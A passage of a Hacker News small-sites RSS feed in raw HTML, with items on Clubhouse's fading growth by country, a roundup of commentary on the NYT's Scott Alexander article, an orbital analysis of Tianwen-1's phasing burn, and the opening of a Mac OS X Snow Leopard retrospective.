https://zandrey.com/content/images/size/w1000/2021/02/Screen-Shot-2021-02-22-at-2.02.41-PM.png 1000w, https://zandrey.com/content/images/2021/02/Screen-Shot-2021-02-22-at-2.02.41-PM.png 1418w" sizes="(min-width: 1200px) 1200px"></figure><p>Japan:</p><figure><img src="https://zandrey.com/content/images/2021/02/Screen-Shot-2021-02-22-at-2.04.15-PM.png" alt="" srcset="https://zandrey.com/content/images/size/w600/2021/02/Screen-Shot-2021-02-22-at-2.04.15-PM.png 600w, https://zandrey.com/content/images/size/w1000/2021/02/Screen-Shot-2021-02-22-at-2.04.15-PM.png 1000w, https://zandrey.com/content/images/2021/02/Screen-Shot-2021-02-22-at-2.04.15-PM.png 1421w" sizes="(min-width: 1200px) 1200px"></figure><p>The spikes are caused by local influencers, and after Clubhouse ran out of celebrities, the growth stumbled here as well:</p><blockquote>A handful of Japanese celebrities were invited to Clubhouse in late January by friends in the tech industry, including TV commentator and comedian <a href="https://twitter.com/atsushilonboo/status/1354441357738184704" rel="noopener noreferrer">Atsushi Tamura</a>, who was one of the first widely recognized figures to log on. He was followed by actress and fashion designer Naomi Watanabe, who racked up over 500,000 followers in her first two weeks on the app. Celebrated kabuki and film actor Ebizo Ichikawa is also a <a href="https://twitter.com/EBIZO_DES/status/1356535391403208706" rel="noopener noreferrer">Clubhouse convert</a>, appearing in rooms every few days in recent weeks.</blockquote><p><a href="https://restofworld.org/2021/four-countries-one-clubhouse/">via</a> </p><p>Germany:</p><figure><img src="https://zandrey.com/content/images/2021/02/Screen-Shot-2021-02-22-at-2.07.49-PM.png" alt="" srcset="https://zandrey.com/content/images/size/w600/2021/02/Screen-Shot-2021-02-22-at-2.07.49-PM.png 600w, https://zandrey.com/content/images/size/w1000/2021/02/Screen-Shot-2021-02-22-at-2.07.49-PM.png 1000w, https://zandrey.com/content/images/2021/02/Screen-Shot-2021-02-22-at-2.07.49-PM.png 1419w" sizes="(min-width: 1200px) 1200px"></figure><p>Turkey:</p><figure><img src="https://zandrey.com/content/images/2021/02/Screen-Shot-2021-02-22-at-2.09.00-PM.png" alt="" srcset="https://zandrey.com/content/images/size/w600/2021/02/Screen-Shot-2021-02-22-at-2.09.00-PM.png 600w, https://zandrey.com/content/images/size/w1000/2021/02/Screen-Shot-2021-02-22-at-2.09.00-PM.png 1000w, https://zandrey.com/content/images/2021/02/Screen-Shot-2021-02-22-at-2.09.00-PM.png 1420w" sizes="(min-width: 1200px) 1200px"></figure><p>One of the few countries that's doing really well is Russia. Half of my contact list is still from Russia and I see them onboarding in droves every day:</p><figure><img src="https://zandrey.com/content/images/2021/02/Screen-Shot-2021-02-22-at-2.10.29-PM.png" alt="" srcset="https://zandrey.com/content/images/size/w600/2021/02/Screen-Shot-2021-02-22-at-2.10.29-PM.png 600w, https://zandrey.com/content/images/size/w1000/2021/02/Screen-Shot-2021-02-22-at-2.10.29-PM.png 1000w, https://zandrey.com/content/images/2021/02/Screen-Shot-2021-02-22-at-2.10.29-PM.png 1414w" sizes="(min-width: 1200px) 1200px"></figure><p>It would be very interesting to revisit the graphs above in a few weeks and see how everything is going. So far, it looks like after the initial boost by the local celebrities, people got tired of wandering aimlessly from room to room and the growth is stifled. </p>
			</section></div>]]>
            </description>
            <link>https://zandrey.com/why-clubhouse-is-fading-out/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26231469</guid>
            <pubDate>Mon, 22 Feb 2021 22:21:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scott Alexander vs. NYT: Meta-Analysis, Part 2]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26231449">thread link</a>) | @nabla9
<br/>
February 22, 2021 | https://www.metalevelup.com/post/scott-alexander-vs-nyt-meta-analysis-part-2 | <a href="https://web.archive.org/web/*/https://www.metalevelup.com/post/scott-alexander-vs-nyt-meta-analysis-part-2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="8.17.5"><div dir="ltr"><div><p id="viewer-foo"><span><a href="https://www.metalevelup.com/post/scott-alexander-vs-nyt-meta-analysis-part-1" target="_blank" rel="noopener"><u>See here for Part 1</u></a>, including Scott Alexander, Fredrik DeBoer, Jacob Falkovich, and Elizabeth Spiers. </span></p><p id="viewer-lqhd"><span>Minor correction: rereading Jacob Falkovich's take and <a href="https://twitter.com/yashkaf/status/1362877478327435272" target="_blank" rel="noopener"><u>some of the things he's tweeted since</u></a>, I moved him a bit further left on the "Call To Action" axis (see end of this post).</span></p><h2 id="viewer-4hi0v"><span><a href="https://www.scottaaronson.com/blog/?p=5310" target="_blank" rel="noopener"><u><span>Article #5: Scott Aaronson</span></u></a></span></h2><p id="viewer-8luck"><span><span>(</span><a href="https://www.scottaaronson.com/blog/?p=5310" target="_blank" rel="noopener"><span><em><u>A grand anticlimax: The New York Times on Scott Alexander</u></em></span></a><span><em><u>,</u></em></span></span></p><p id="viewer-fool"><span><span>but I recommend you see also </span><a href="https://www.scottaaronson.com/blog/?p=5330" target="_blank" rel="noopener"><span><em><u>On standing up sans backbone</u></em></span></a><span>)</span></span></p><p id="viewer-art8b"><span><span>The NYT article about Scott may not have happened without Scott. No wait, Scott A. and Scott A. Wait! I mean, the piece about Scott Al. may not have happened without Scott Aa.</span></span></p><blockquote id="viewer-3oppr"><span><span>I spent many hours with Cade [Metz], taking his calls and emails morning or night, at the playground with my kids or wherever else I was, answering his questions, giving context for his other interviews, suggesting people in the rationalist community for him to talk to, in exactly the same way I might suggest colleagues for a quantum computing story. And then I spent just as much time urging those people to talk to Cade.</span></span></blockquote><p id="viewer-b07b1"><span><span>Scott Aa. had previously worked with Metz, and found him to be a trustworthy journalist; he had no reason to mistrust when Metz said he was interested in Rationalists and, in particular, why the community had gotten COVID so right when the rest of media/government was getting it so wrong. </span></span></p><p id="viewer-81kqf"><span><span>When the story came out (with no mention of the COVID angle, by the way), Scott Aa. was not pleased, and in his post he details 14 ways the story was misleading or wrong (up from </span><a href="https://astralcodexten.substack.com/p/statement-on-new-york-times-article" target="_blank" rel="noopener"><span><u>Scott Al.'s 4</u></span></a><span>). This, in spite of Scott Aa. having talked with Metz about all of these details, only to have the final piece end up missing the point about all of them.</span></span></p><blockquote id="viewer-dfp21"><span><span>The trouble with the NYT piece is not that it makes any false statements, but just that it constantly </span><em>insinuates</em><span> nefarious beliefs and motives, via strategic word choices and omission of relevant facts that change the emotional coloration of the facts that it </span><em>does</em><span> present. I repeatedly muttered to myself, as I read: “dude, you could make </span><em>anything</em><span> sound shady with this exact same rhetorical toolkit!”
...
[W]ere I ever tempted to bang my head and say, “dammit, I wish I’d told Cade X, so his story could’ve reflected that perspective”—well, the truth of the matter is that I </span><em>did</em><span> tell him X! It’s just that I don’t get to decide which X’s make the final cut, or which ideological filter they’re passed through first.</span></span></blockquote><p id="viewer-e0qo9"><span><span>He remains agnostic about how much of the bad piece was due to Metz, and how much was due to NYT editors. </span></span></p><p id="viewer-euamv"><span><span>In spite of being upset about what happened, Scott Aa. originally planned not to change his behavior with journalists in the future; in the end, he may have acted rationally based on the knowledge he had and could not have known that this would be the outcome. However, </span><a href="https://www.scottaaronson.com/blog/?p=5330" target="_blank" rel="noopener"><span><u>in a follow-up post</u></span></a><span>, he announces that he won't work with Metz again without some kind of explanation that sufficiently exonerates him. From one of the more rational non-Rationalists around, who updates very carefully and Bayesian-ly, this is a pretty strong statement.</span></span></p><blockquote id="viewer-8ev8a"><span><span>I now feel like to work with Metz again, even just on some quantum computing piece, would be to reward—and to be seen as rewarding—journalistic practices that are making the world worse...</span></span></blockquote><p id="viewer-64lu2"><span><span>Overall, Scott Aa. seems more upset than Scott Al. or Jacob or Elizabeth, but less upset than Freddie (from </span><a href="https://www.metalevelup.com/post/scott-alexander-vs-nyt-meta-analysis-part-1" target="_blank" rel="noopener"><span><u>Part 1</u></span></a><span>).</span></span></p><p id="viewer-6j33u"><span><span><u>One Sentence Summary:</u> <em>The NYT article was bad, and people who contributed to it (including Scott Aa. himself) were misled into helping it be written; this seems to imply untrustworthy actors at the NYT, if not directly nefarious and bad-faith ones..</em></span></span></p><p id="viewer-cdl3m"><span><strong><em><span>(From here on I'm going back to calling Scott Alexander "Scott", not "Scott Al.")</span></em></strong></span></p><h2 id="viewer-bqnbm"><span><a href="https://www.piratewires.com/p/okay-fine-were-fighting" target="_blank" rel="noopener"><u><span>Article #6: Mike Solana</span></u></a></span></h2><p id="viewer-5jhpu"><span><span>(</span><a href="https://www.piratewires.com/p/okay-fine-were-fighting" target="_blank" rel="noopener"><span><em><u>Okay fine, we're fighting</u></em></span></a><span>)</span></span></p><p id="viewer-7t1db"><span><span>According to Mike, the NYT article is more of the same in an ongoing war between tech and media, which nobody wants to admit is an actual war.</span></span></p><blockquote id="viewer-3ijvs"><span>The endless cycle is thus: a hit is published, tech fights back, media fights back, tech fights back, the blue check media gang goes nuclear and accuses tech of targeted harassment for publicly commenting on the actual, literal words they are printing, mea culpa (“we’re all wrong here!”) and a prayer for peace. Then, it’s straight back to the garbage dump. 
<em>I hate it here</em>.</span></blockquote><p id="viewer-6imrc"><span>This piece isn't only on the SSC/NYT situation, but covers also several other recent skirmishes in this war (ignored here). It is all just routine now, a back and forth between two camps--something like Tech and Media--that hate and can't seem to abide one another. </span></p><p id="viewer-dvgl2"><span>Mike is not mad in particular about this piece because <em>this is just what NYT does</em>, and nobody should pretend to be surprised by it.</span></p><blockquote id="viewer-37k9f"><span><em>The New York Times</em> isn’t publishing one-off hit pieces. At least, in the narrow context of tech coverage, it is obvious many reporters at the <em>Times</em>, and across the press broadly, confuse the attention they receive for provoking controversy with righteous affirmation. They think, in general, they are doing good work — not just well-reported work, but <em>morally good</em> work...</span></blockquote><p id="viewer-eml9l"><span>While he stops short of fully supporting <a href="https://www.blocknyt.com/" target="_blank" rel="noopener"><u>#BlockTheNYT</u></a> (at least, he didn't explicitly update his stance <a href="https://www.piratewires.com/p/a-policy-of-truth-987" target="_blank" rel="noopener"><u>from a previous post</u></a>), he closes with skepticism of their credibility and good faith.</span></p><blockquote id="viewer-datei"><span>[F]ine, whatever, we’re in fight. We’re fighting. But let’s call it that... let’s dispel with the bullshit “objectivity” frame and robustly, openly disagree. We want different things, so what? You think you maybe kind of hate me, okay. Just do me a favor and tweet it.</span></blockquote><p id="viewer-20d0m"><span><u><em>One Sentence Summary</em></u>: <em>The NYT piece was bad in a way that most tech journalism is bad, because Media sees Tech as a threat; this is just the latest strike in a long-standing war between the two.</em></span></p><h2 id="viewer-936oa"><span><a href="https://noahpinion.substack.com/p/silicon-valley-isnt-full-of-fascists" target="_blank" rel="noopener"><u><span>Article #7: Noah Smith</span></u></a></span></h2><p id="viewer-ct0b5"><span><span>(</span><a href="https://noahpinion.substack.com/p/silicon-valley-isnt-full-of-fascists" target="_blank" rel="noopener"><span><em><u>Silicon Valley isn't full of fascists</u></em></span></a><span>)</span></span></p><p id="viewer-3gqju"><span><span>In a smog of people decrying political partisanship with angry words, Noah is a breath of statistically-literate fresh air. His central thesis about the NYT article is clear:</span></span></p><blockquote id="viewer-724vg"><span>To put it bluntly, I think the article both draws on and feeds into the mistaken stereotype that Silicon Valley is full of right-wingers.</span></blockquote><p id="viewer-6fcvm"><span>Noah argues that the NYT imagines a world that looks like this:</span></p><div id="viewer-d2lvt"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.metalevelup.com/post/scott-alexander-vs-nyt-meta-analysis-part-2" data-pin-media="https://static.wixstatic.com/media/28c66d_abdf245248e943eea02b4868c6af4d56~mv2.jpeg/v1/fit/w_1000%2Ch_1000%2Cal_c%2Cq_80/file.jpeg" src="https://static.wixstatic.com/media/28c66d_abdf245248e943eea02b4868c6af4d56~mv2.jpeg/v1/fit/w_300,h_300,al_c,q_5/file.jpeg"></p></div></div></div></div><p id="viewer-evq04"><span>When in reality it looks more like this:</span></p><div id="viewer-fb6dr"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.metalevelup.com/post/scott-alexander-vs-nyt-meta-analysis-part-2" data-pin-media="https://static.wixstatic.com/media/28c66d_a0f2b64fc1524f3ba60c463d7e482986~mv2.jpeg/v1/fit/w_1000%2Ch_1000%2Cal_c%2Cq_80/file.jpeg" src="https://static.wixstatic.com/media/28c66d_a0f2b64fc1524f3ba60c463d7e482986~mv2.jpeg/v1/fit/w_300,h_300,al_c,q_5/file.jpeg"></p></div></div></div></div><p id="viewer-cme0n"><span>And the rest of his post looks at the data to show how Silicon Valley, SSC, and Rationalism are nothing like safe havens for right-wing politics.</span></p><p id="viewer-98de7"><span>1) <u>On Silicon Valley politics</u>:</span></p><blockquote id="viewer-eseom"><span>Though Silicon Valley founders tend to be more skeptical of regulation and unions than the average Democrat (as you might expect given their jobs), they are overwhelmingly Democrats. On social issues (gay marriage, abortion, gun control, etc.) they are much more liberal even than the average college-educated Democrat. They also strongly favor government redistribution, which you might think would go against their class incentives. And most importantly, they score <strong>lower on </strong><a href="https://en.wikipedia.org/wiki/Racial_resentment_scale" target="_blank" rel="noopener"><strong>racial resentment</strong></a> and lower on the authoritarianism scale than the average Democratic base voter. In short, <strong>tech entrepreneurs are standard liberal nerds</strong>.</span></blockquote><p id="viewer-3mhsp"><span>2) <u>On SSC politics</u>: SSC likely has no more than 10k readers, and <a href="https://slatestarcodex.com/2020/01/20/ssc-survey-results-2020/" target="_blank" rel="noopener"><u>only ~40% of his readership works in a tech-adjacent field</u></a>; on the other hand, there are nearly 400k tech workers in the San Francisco Bay Area.</span></p><blockquote id="viewer-6b1sh"><span>In other words, Slate Star Codex was almost certainly a niche interest within the tech industry.</span></blockquote><p id="viewer-44r49"><span>There's no way SSC is holding sway with anything like a majority of Silicon Valley, let alone Tech more generally.</span></p><p id="viewer-dug47"><span>3) <u>On Rationalist politics</u>:</span></p><p id="viewer-8v5rv"><span>Like SSC readers, Rationalists are not primarily in tech ("the <em>only</em> major Rationalist figure I could find who is actually <em>in</em> tech is Eliezer Yudkowsky, who is sort of an A.I researcher" (lol at "sort of")), but like Silicon-Valley-ites most public Rationalists have left-leaning politics. Based on Scott's complicated stances around e.g. BLM and feminism, Noah reluctantly gives him the label of "conservative". (Of course given that Scott is "<a href="https://slatestarcodex.com/2019/02/22/rip-culture-war-thread/" target="_blank" rel="noopener"><u>a pro-gay Jew who has dated trans people and votes pretty much straight Democrat</u></a>" and in 2016 <a href="https://slatestarcodex.com/2016/09/28/ssc-endorses-clinton-johnson-or-stein/" target="_blank" rel="noopener"><u>endorsed literally "anyone but Trump"</u></a>, I doubt he means "conservative" as in "right-wing" or "Trumpian".)</span></p><p id="viewer-f1k56"><span>Noah's upset to the extent that the NYT gets this general picture wrong, and he retorts with his own analysis of the relevant statistical facts. He doesn't appear to see this as part of any big failure mode in media, so no larger call to action is necessary.</span></p><p id="viewer-2otrq"><span><u><em>One Sentence Summary</em></u>: <em>The NYT piece is wrong in its broad picture of the relationship of Tech, Rationalism, and SSC readership.</em></span></p><h2 id="viewer-6356u"><span><a href="https://modelcitizen.substack.com/p/grey-lady-steel-man" target="_blank" rel="noopener"><u><span>Article #8: Will Wilkinson</span></u></a><span> </span></span></h2><p id="viewer-7l3sv"><span><span>(</span><a href="https://modelcitizen.substack.com/p/grey-lady-steel-man" target="_blank" rel="noopener"><span><em><u>Grey Lady Steel Man</u></em></span></a><span><em><u>,</u></em></span></span></p><p id="viewer-fh38"><span><span>but I recommend you see also </span><a href="https://www.youtube.com/watch?v=XcGyJQnpPas" target="_blank" rel="noopener"><span><em><u>his interview with Robert Wright</u></em></span></a><span>)</span></span></p><p id="viewer-2p4q4"><span><span>Will tells a decidedly different story than most others, because it is primarily told from the perspective of Cade Metz rather than Scott Alexander.</span></span></p><blockquote id="viewer-4mnkf"><span>Somebody tells Metz about SSC, he finds it really interesting, wants to write some kind of article...
Metz contacts Siskind and at some point he tells Scott that he already knows his real name and at some point Scott tells Metz it’s very important that he doesn’t use his real name...
Well, the <em>Times</em> won’t promise, so Siskind <em>actually does [burn SSC to the ground].</em> This seems super-crazy and the natural journalistic response to it is “What the hell is this man hiding? What’s he so afraid I’ll find on his blog?”</span></blockquote><p id="viewer-allr8"><span>Whatever Metz's piece was about before went immediately to the back-burner; he certainly must have taken Scott nuking is own blog as evidence of something much <em>much</em> more interesting. So he went digging. Scott himself notes that around this time, Metz "switched to interviewing everyone who hated me and asking a lot of leading questions about potentially bad things I did." SSC readers think this might be a sinister revenge plot, but a good journalist follows their nose, and Metz' smelled something fishy about this man who would insist on his anonymity at the expense of his entire body of work and hard-fought online following.</span></p><p id="viewer-5962p"><span>What did Scott have to hide, that he would give all that up to keep it under wraps? According to Will, this question--not Silicon Valley, not Rationalism--is the real topic of the NYT piece. </span></p><p id="viewer-66ckm"><span>And…</span></p></div></div></div></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.metalevelup.com/post/scott-alexander-vs-nyt-meta-analysis-part-2">https://www.metalevelup.com/post/scott-alexander-vs-nyt-meta-analysis-part-2</a></em></p>]]>
            </description>
            <link>https://www.metalevelup.com/post/scott-alexander-vs-nyt-meta-analysis-part-2</link>
            <guid isPermaLink="false">hacker-news-small-sites-26231449</guid>
            <pubDate>Mon, 22 Feb 2021 22:20:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tianwen-1 Phasing Orbit]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26231383">thread link</a>) | @parsecs
<br/>
February 22, 2021 | https://destevez.net/2021/02/tianwen-1-phasing-orbit/ | <a href="https://web.archive.org/web/*/https://destevez.net/2021/02/tianwen-1-phasing-orbit/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-9763">

	

	<div>
		
<p>Last Saturday 2021-02-20 at 11:46:42 UTC <a href="https://destevez.net/tag/tianwen/">Tianwen-1</a> passed the periapsis of its elliptical polar orbit at Mars and made a retrograde burn to reduce its apoapsis radius. The  trajectory planning of the spacecraft can be seen in its <a href="https://en.wikipedia.org/wiki/Tianwen-1">Wikipedia page</a>: the spacecraft first arrived into a low inclination elliptical orbit by making a <a href="https://twitter.com/ea4gpz/status/1359433349018882050">Mars orbit insertion</a> at periapsis, then coasted to apoapsis, where it performed a <a href="https://destevez.net/2021/02/tianwen-1-plane-change-planning/">plane change</a>, and then it arrived at periapsis, performing the manoeuvre described in this post.</p>



<p>Over the next few days the spacecraft should move into a reconnaissance orbit, which is given in Wikipedia to be a 265 x 60000 km orbit (having a period of 2 days) with an inclination of 86.9 degrees. However, the last burn hasn’t lowered the apoapsis that much. The current orbit is approximately 280 x 84600 km (3.45 day period) with an inclination of 87.7 degrees. A possible reason for using the current orbit, which has been described as a phasing orbit, will be explained in this post after reviewing the data we have about the burn.</p>



<p>As I usually do, to compute the moment and delta-V of the burn I propagate the pre-burn and post-burn trajectories in <a href="http://gmat.sourceforge.net/docs/">GMAT</a> using <a href="https://github.com/daniestevez/jupyter_notebooks/blob/master/Tianwen/orbit/phasing_burn_vectors.script">this script</a>, and study the output in <a href="https://github.com/daniestevez/jupyter_notebooks/blob/master/Tianwen/Tianwen-1%20phasing%20burn.ipynb">this Jupyter notebook</a>. I obtain an intersection at 11:44:18 UTC, which is pretty close to the periapsis passage, so the data seems correct.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2021/02/trajectories_intersection.png"><img width="644" height="341" src="https://destevez.net/wp-content/uploads/2021/02/trajectories_intersection-644x341.png" alt="" srcset="https://destevez.net/wp-content/uploads/2021/02/trajectories_intersection-644x341.png 644w, https://destevez.net/wp-content/uploads/2021/02/trajectories_intersection-300x159.png 300w, https://destevez.net/wp-content/uploads/2021/02/trajectories_intersection.png 730w" sizes="(max-width: 644px) 100vw, 644px"></a></figure>



<p>The delta-V vector in m/s using the Mars body inertial frame described in <a href="https://destevez.net/2021/02/tianwen-1-mars-centric-state-vectors/" data-type="post" data-id="9635">this post</a> is</p>



<pre>[-1.477, -1.912, 52.565]</pre>



<p>This vector has a magnitude of 52.62 m/s. Assuming a dry mass of 2500 kg and fuel mass of 950 kg, this burn would have taken 60 seconds with the 3 kN thrusters, and spent 57 kg of fuel. Thus, according to our (somewhat crude) fuel estimates, approximately 900 kg of fuel remain now.</p>



<p>It is convenient to write the delta-V vector in the VNB frame whose axes are given by V, the velocity vector, N, the vector normal to the orbit (which is defined to point along the cross product of the radius and V), and B, the bi-normal vector, which is the cross product of V and N. The VNB coordinates in m/s are</p>



<pre>[-50.406,  0.032,  15.104]</pre>



<p>We see that most of the burn happens along -V as expected for a retrograde burn, but there is a significant component along +B. This is perhaps a bit unexpected. The effect of a +B burn is to move the periapsis backwards along the orbit, so that it would move to a slightly more northern latitude (the spacecraft descends from north to south on the periapsis passage). In fact, the periapsis has moved from a latitude of 10.03º N to a latitude of 10.25º N. This might be relevant for the discussion that comes below.</p>



<p>Now the good question is what is the reason for moving to this intermediate phasing orbit with a 3.45 day period instead of moving directly to the 2 day period orbit? I think there is a quite reasonable explanation, but we must first understand the purpose of the 2 day period reconnaissance orbit. This will be the orbit used by the spacecraft to map and survey the intended landing site, until the lander is released, which is expected to happen in May or June.</p>



<p>Therefore, it seems quite desirable to have an orbit whose periapsis ground track always passes over the landing site. This gives plenty of opportunities for gathering survey data and is also mandatory for the release of the lander, which is basically going to be done from the reconnaissance orbit (by first lowering its periapsis in a suitable manner). So all this makes me think that the quoted “2 day period” is actually 2 Mars sidereal days (a Mars sidereal day is 24 hours, 37 minutes and 22 seconds), since that would give a repeating ground track.</p>



<p>For this plan to work well, the periapsis of the the orbit needs to be at the correct longitude by the time that the 2 sidereal day orbit is entered. Otherwise the ground track will be repeating, but it will not pass over the landing site. Now, the longitude of the next periapsis of the current orbit turns out to be 111.3º E. In Wikipedia the coordinates of the intended landing site in <a href="https://en.wikipedia.org/wiki/Utopia_Planitia">Utopia Planitia</a> are given as 24.748º N, 110.318º E. Note that the latitude of the site is somewhat higher than the latitude of the periapsis of the current orbit, so perhaps moving the periapsis north is desirable. This might (but only might) be the reason for the burn component along B.</p>



<p>So we see that around the next periapsis, which is going to be tomorrow 2021-02-23 at 22:31:37 UTC, the spacecraft will pass above the landing site. Given this circumstance, it can now enter the 2 sidereal day reconnaissance orbit, which will then have a repeating ground track that always passes over the landing site.</p>



<p>There is no magic involved in these adjustments. Coming in from the previous orbit last Saturday, when arriving to the periapsis it is just enough to adjust the apoapsis altitude (and hence the orbit period) in such a way that when the spacecraft comes to the next periapsis Mars has rotated below the orbit so as to place the longitude of the landing site below the orbit. The required period to do this will depend on the (signed) difference between the longitude of the periapsis where the burn is performed and the longitude of the landing site. Therefore, the name “phasing orbit” is completely justified. The purpose of the current orbit would be to wait until the rotation of Mars places the landing site below the orbit.</p>



<p>To see what the passage to the 2 sidereal day orbit at next periapsis would look like, I have made this <a href="https://github.com/daniestevez/jupyter_notebooks/blob/master/Tianwen/orbit/phasing_orbit.script">GMAT script</a>. By adjusting the delta-V of the periapsis burn, I have seen that a 40.9 m/s burn will give an orbit with a ground track that is very close to be repeating. This is shown in the figure below.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_052.png"><img width="644" height="315" src="https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_052-644x315.png" alt="" srcset="https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_052-644x315.png 644w, https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_052-300x147.png 300w, https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_052-768x376.png 768w, https://destevez.net/wp-content/uploads/2021/02/GmatScreenShot_052.png 1350w" sizes="(max-width: 644px) 100vw, 644px"></a><figcaption>2 sidereal day orbit, with ground track passing over the landing site</figcaption></figure>



<p>There is some degree of complication here regarding orbit perturbations. The plot above shows 14 days of ground track, and we see that at some point the ground track starts to slowly creep to the east. The propagator I’m using here is quite detailed: the 80×80 <a href="https://ui.adsabs.harvard.edu/abs/2001JGR...10623359L/abstract">GMM-2B</a> Mars gravity model, point mass forces for all planets and the Sun, relativistic effects, and an integration step of at most 50 seconds (no solar radiation pressure or atmospheric drag, though).</p>



<p>Something I haven’t understood completely is why the period of the orbit shown above is actually 162 seconds longer than two sidereal days. Forgetting about perturbations, the track of such an orbit would drift some 0.66 degrees to the west per revolution. However, if I try to adjust the orbit to have a period closer to 2 sidereal days, I get much more drift of the ground track than with this orbit solution. I don’t know if this is caused by perturbations or by numerical accuracy (perhaps related to the integrator). This is something that might deserve more in-depth study. In any case, probably the real-world orbit will need some degree of station keeping to correct for perturbations.</p>



<p>The apoapsis radius of this 2 sidereal day orbit is 61217 km (giving an apoapsis altitude of 57821 km), while the periapsis has an altitude of 282 km (logically, still close to the 280 km we started with on Saturday). Therefore, some care should be taken when quoting this as a 265 x 60000 km orbit. That can be slightly misleading, as it is not clear if 60000 km refers to the apoapsis radius or altitude.</p>



<p>To summarize, in this post we have shown that it is very likely that the purpose of the current orbit is to pass over the landing site at next periapsis on 2021-02-23 22:31:37 UTC. Then a burn would lower the apoapsis further to obtain an orbit with a period of 2 sidereal days that has a repeating ground track passing over the landing site.</p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article></div>]]>
            </description>
            <link>https://destevez.net/2021/02/tianwen-1-phasing-orbit/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26231383</guid>
            <pubDate>Mon, 22 Feb 2021 22:13:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Retrospective Look at Mac OS X Snow Leopard]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26231212">thread link</a>) | @NaOH
<br/>
February 22, 2021 | http://morrick.me/archives/9220 | <a href="https://web.archive.org/web/*/http://morrick.me/archives/9220">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<h2>Introduction</h2>
<p>My recent article, <a href="http://morrick.me/archives/9150"><em>The reshaped Mac experience</em></a>, received a lot of attention judging from the response on Twitter and the WordPress analytics — apparently, among other places, it reached Hacker News and Reddit. Unlike my four-part series&nbsp;<em>‌Mac OS Catalina: more trouble than it’s worth</em>, however, it didn’t attract any hate mail at all. The sheer majority of feedback I received was very positive, with many many people agreeing with me and my observations. A few — some provocatively, some genuinely curious — asked me something along the lines of, <em>Well, if you dislike the current Big Sur UI and Mac experience, what’s an example of Mac OS UI and experience you DO&nbsp;like?</em></p>
<p>It’s a more than fair question, and this piece serves as an answer. When I wrote back to those who asked me, I replied <em>Mac OS X 10.6 Snow Leopard</em>. It was sort of a gut-reply based largely on fond memories of using that Mac OS version quite extensively.</p>
<p>When I purchased my 15-inch MacBook Pro in July 2009, it came with Mac OS X 10.5.7 (Leopard), but I immediately upgraded to Snow Leopard when it was released a month or so afterwards. As you know (and if you don’t, here’s a refresher), together with Mac OS X 10.4 Tiger, Snow Leopard was one of the Mac OS versions with the longest lifespan — almost two years, from August 2009 to July 2011, when the final 10.6.8 v1.1 minor release came out. On my 2009 MacBook Pro, I kept using it until mid-2012, as Mac OS X 10.7 Lion (released in July 2011) didn’t fully convince me at first, so I waited until at least version 10.7.3 before upgrading.</p>
<p>So, I used Snow Leopard on my 2009 MacBook Pro for about three years, and then again on a 2010 Mac mini that a friend gave me to maintain, as a sort of offsite backup. That Mac mini was kept on Mac OS X 10.6.8 for the whole four years it was in my custody (2011–2015) and it was switched off only twice during that period and maybe restarted four or five times in total. It enjoyed an insane uptime and it was a testament to Snow Leopard’s stability.</p>
<p>But back to my ‘gut-reply’, I wanted to be certain that my fond memories of Snow Leopard weren’t just nostalgia. While I am confident when I say that Snow Leopard is the most stable version of Mac OS, I wanted to make sure its user interface was really the good user interface and experience I was remembering. So, after a few frustrating attempts at creating a virtual machine on my current iMac with Mac OS High Sierra, I decided to install Snow Leopard on a USB flash drive, and boot my 2009 MacBook Pro (yes, it’s still alive <span>&amp;</span> kicking) in Snow Leopard from that flash&nbsp;drive.</p>
<h2>Installation</h2>
<p><a href="https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/01-Install-MacOSX-SL.jpg"><img loading="lazy" src="https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/01-Install-MacOSX-SL.jpg?resize=960%2C1280" alt="" width="960" height="1280" srcset="https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/01-Install-MacOSX-SL.jpg?w=1512 1512w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/01-Install-MacOSX-SL.jpg?resize=260%2C347 260w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/01-Install-MacOSX-SL.jpg?resize=640%2C853 640w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/01-Install-MacOSX-SL.jpg?resize=768%2C1024 768w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/01-Install-MacOSX-SL.jpg?resize=1152%2C1536 1152w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/02/01-Install-MacOSX-SL.jpg?resize=1194%2C1592 1194w" sizes="(max-width: 960px) 100vw, 960px" data-recalc-dims="1"></a></p>
